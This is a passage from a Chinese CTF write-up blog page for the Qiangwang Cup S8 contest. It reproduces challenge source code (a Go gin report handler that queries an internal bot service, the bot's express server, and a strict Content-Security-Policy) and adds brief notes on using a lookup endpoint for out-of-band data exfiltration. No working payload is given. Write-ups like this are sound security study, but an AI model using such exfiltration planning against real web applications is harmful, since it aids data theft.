        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>

    reportMutex<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> reportGoroutineCount <span class="token operator">>=</span> <span class="token number">32</span> <span class="token punctuation">&#123;</span>
        reportMutex<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusTooManyRequests<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Too many requests"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    reportMutex<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        reportMutex<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        reportGoroutineCount<span class="token operator">++</span>
        reportMutex<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            reportMutex<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            reportGoroutineCount<span class="token operator">--</span>
            reportMutex<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

        req<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"http://bot:52000/api/bot"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
            report<span class="token punctuation">.</span>CheckResult <span class="token operator">=</span> <span class="token string">"error"</span>
            db<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>
        q <span class="token operator">:=</span> req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        q<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"expr"</span><span class="token punctuation">,</span> report<span class="token punctuation">.</span>Expression<span class="token punctuation">)</span>
        req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawQuery <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

        client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
            report<span class="token punctuation">.</span>CheckResult <span class="token operator">=</span> <span class="token string">"error"</span>
            db<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>StatusCode <span class="token operator">!=</span> http<span class="token punctuation">.</span>StatusOK <span class="token punctuation">&#123;</span>
            report<span class="token punctuation">.</span>CheckResult <span class="token operator">=</span> <span class="token string">"error"</span>
            db<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>

        resBody<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
            report<span class="token punctuation">.</span>CheckResult <span class="token operator">=</span> <span class="token string">"error"</span>
            db<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>

        report<span class="token punctuation">.</span>CheckResult <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>resBody<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ok"</span><span class="token punctuation">,</span> <span class="token string">"data"</span><span class="token punctuation">:</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> report<span class="token punctuation">.</span>ID<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>index.ts</p>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> NextFunction <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> botHandler <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'./bot'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">asyncHandler</span> <span class="token operator">=</span> func <span class="token operator">=></span> <span class="token punctuation">(</span>req<span class="token operator">:</span> Request<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">,</span> next<span class="token operator">:</span> NextFunction<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token builtin">Promise</span>
        <span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token function">func</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">main</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/bot'</span><span class="token punctuation">,</span> <span class="token function">asyncHandler</span><span class="token punctuation">(</span>botHandler<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> req<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> res<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> next<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[-] Error processing request </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token punctuation">(</span>req <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">.</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>err<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
            res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> status<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> message<span class="token operator">:</span> <span class="token string">'Internal server error'</span><span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">&#123;</span> id<span class="token operator">:</span> <span class="token punctuation">(</span>req <span class="token keyword">as</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token punctuation">.</span>id <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'close'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">52000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] Bot server started'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里会给内网的 bot 发请求</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/api/report/:id"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    id <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Param</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>

    <span class="token keyword">var</span> report Report
    <span class="token keyword">if</span> err <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"id = ?"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span><span class="token punctuation">.</span>Error<span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Report not found"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">var</span> screenshots <span class="token punctuation">[</span><span class="token punctuation">]</span>Screenshot
    <span class="token keyword">if</span> err <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"report_id = ?"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>screenshots<span class="token punctuation">)</span><span class="token punctuation">.</span>Error<span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>

    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ok"</span><span class="token punctuation">,</span> <span class="token string">"data"</span><span class="token punctuation">:</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"report"</span><span class="token punctuation">:</span> report<span class="token punctuation">,</span> <span class="token string">"screenshots"</span><span class="token punctuation">:</span> screenshots<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span><span class="token function">NoRoute</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"index.tpl"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
        <span class="token string">"nonce"</span><span class="token punctuation">:</span> c<span class="token punctuation">.</span><span class="token function">MustGet</span><span class="token punctuation">(</span><span class="token string">"nonce"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>普通的查询，猜测等会用来带外</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241103152925506.png" alt="image-20241103152925506"></p>
<p>需要注意的是这里设置了csp</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    host <span class="token operator">:=</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Host
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> <span class="token string">"Bad Request"</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">Abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    nonce <span class="token operator">:=</span> <span class="token function">RandStringRunes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"nonce"</span><span class="token punctuation">,</span> nonce<span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"default-src 'none'; script-src 'self' 'unsafe-eval' 'nonce-%s'; style-src 'unsafe-inline' 'self'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'none'; base-uri 'none'; manifest-src 'none'; object-src 'none';"</span><span class="token punctuation">,</span> nonce<span class="token punctuation">)</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"X-Content-Type-Options"</span><span class="token punctuation">,</span> <span class="token string">"nosniff"</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"X-Frame-Options"</span><span class="token punctuation">,</span> <span class="token string">"DENY"</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Cross-Origin-Opener-Policy"</span><span class="token punctuation">,</span> <span class="token string">"same-origin"</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241103154441014.png" alt="image-20241103154441014"></p>
<p><del>拉满，太好了我们没救了</del></p>
<hr>
<h1 id="Proxy-revenge（Unsolved）"><a href="#Proxy-revenge（Unsolved）" class="headerlink" title="Proxy_revenge（Unsolved）"></a>Proxy_revenge（Unsolved）</h1>
    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>